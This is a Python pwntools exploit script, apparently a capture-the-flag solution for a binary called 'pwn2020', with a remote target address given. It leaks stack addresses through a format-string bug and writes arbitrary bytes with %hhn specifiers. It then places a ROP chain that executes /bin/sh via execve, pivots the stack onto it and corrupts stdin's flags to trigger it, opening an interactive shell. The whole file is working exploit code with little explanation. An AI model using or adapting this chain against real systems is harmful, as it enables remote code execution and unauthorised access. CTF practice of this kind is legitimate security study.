import sys
from pwn import *

def leak():
    if REMOTE:
        t.recvuntil('==\n')
    t.sendline('%p|'*90)
    t.recvuntil('at you.\n')
    leak = t.recv()
    leak = leak.split('|')
    return leak

def write_byte(what, where, fudge=0, test=False, skip_newline=False):
    if type(what) != int or what < 9 or what > 255:
        log.error('Value to write must be an integer x, s.t. 8 < x < 256')
    log.info('mem[{}] = {}'.format(hex(where), hex(what)))
    
    packed_addr = p32(where)
    if '\x0a' in packed_addr:
        if skip_newline:
            log.info('Skipping address {} because newline'.format(hex(where)))
        else:    
            log.error('Newline in address: {}'.format(hex(where)))

    num_pad_specifiers = 4 + fudge  # our data starts at param 5
    pad_specifiers = '%c'*num_pad_specifiers

    written = 0
    written += 4  # addr
    written += num_pad_specifiers  # 1 byte each

    if written > what:
        log.error("Can't write byte {}, smaller than {}".format(what, written))

    value = '{:03}'.format(what - written)

    if test:
        write_spec = 'p'
    else:
        write_spec = 'hhn'
    fmt = '{}%{}x{}%{}'.format(packed_addr, value, pad_specifiers, write_spec)

    if len(fmt) > 300:
        log.error('Format string too long: {}'.format(len(fmt)))
    # log.info('Sending: {}'.format(fmt))
    t.sendline(fmt)

def write_string(what, where, fudge=0, test=None, skip_newline=False):
    for i in range(len(what)):
        nxt = ord(what[i])
        write_byte(nxt, where + i, fudge=fudge, test=test, skip_newline=skip_newline)

stdin_struct = 0x080ec360

def main():
    leaked = leak()
    stack_leak = int(leaked[3], 16)
    event_ret = stack_leak - 0x14
    event_loop_ret = stack_leak + 0x13c
    second_event_loop_ret = stack_leak - 0x24
    log.info('Stack leak:            {}'.format(hex(stack_leak)))
    log.info('event ret:             {}'.format(hex(event_ret)))
    log.info('event_loop ret:        {}'.format(hex(event_loop_ret)))
    log.info('second event_loop ret: {}'.format(hex(second_event_loop_ret)))

    # Generated by ropper
    rebase_0 = lambda x : p32(x + 0x08048000)
    rop = 'X'*28
    rop += rebase_0(0x0000cfc4) # 0x08054fc4: pop eax; ret;
    rop += '//bi'
    rop += rebase_0(0x0002931a) # 0x0807131a: pop edx; ret;
    rop += rebase_0(0x000a4060)
    rop += rebase_0(0x00002b51) # 0x0804ab51: mov dword ptr [edx], eax; ret;
    rop += rebase_0(0x0000cfc4) # 0x08054fc4: pop eax; ret;
    rop += 'n/sh'
    rop += rebase_0(0x0002931a) # 0x0807131a: pop edx; ret;
    rop += rebase_0(0x000a4064)
    rop += rebase_0(0x00002b51) # 0x0804ab51: mov dword ptr [edx], eax; ret;
    rop += rebase_0(0x00004bea) # 0x0804cbea: pop dword ptr [ecx]; ret;
    rop += p32(0x00000000)
    rop += rebase_0(0x0000cfc4) # 0x08054fc4: pop eax; ret;
    rop += p32(0x00000000)
    rop += rebase_0(0x0002931a) # 0x0807131a: pop edx; ret;
    rop += rebase_0(0x000a4068)
    rop += rebase_0(0x00002b51) # 0x0804ab51: mov dword ptr [edx], eax; ret;
    rop += rebase_0(0x000001d1) # 0x080481d1: pop ebx; ret;
    rop += rebase_0(0x000a4060)
    rop += rebase_0(0x00098e69) # 0x080e0e69: pop ecx; ret;
    rop += rebase_0(0x000a4068)
    rop += rebase_0(0x0002931a) # 0x0807131a: pop edx; ret;
    rop += rebase_0(0x000a4068)
    rop += rebase_0(0x0000cfc4) # 0x08054fc4: pop eax; ret;
    rop += p32(0x0000000b)
    rop += rebase_0(0x00029930) # 0x08071930: int 0x80; ret;
    rop = rop.ljust(298, 'B')

    log.info('Putting chain on stack')
    t.sendline(rop)

    # Loop back round to main to leave our shellcode on the stack
    log.info('Looping back to main')
    write_byte(0x4a, event_ret)

    # Our chain is at esp + 0x38 
    # 0x080936cb: add esp, 0x34; mov eax, ebx; pop ebx; pop esi; ret;
    log.info('Writing pivot gadget')
    write_string(p32(0x080936cb)[:3], second_event_loop_ret)

    # Overwrite stdin flags with 0xff, this will make fgets return NULL
    # so we return from event_loop
    log.info('Overwriting stdin flags to trigger chain')
    write_byte(0xff, stdin_struct)

    t.clean()
    log.info('Spawning shell...')
    t.interactive()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        REMOTE = True
        t = remote('35.246.24.45', 1)
    else:
        REMOTE = False
        t = process('./pwn2020')
        pause()
    main()
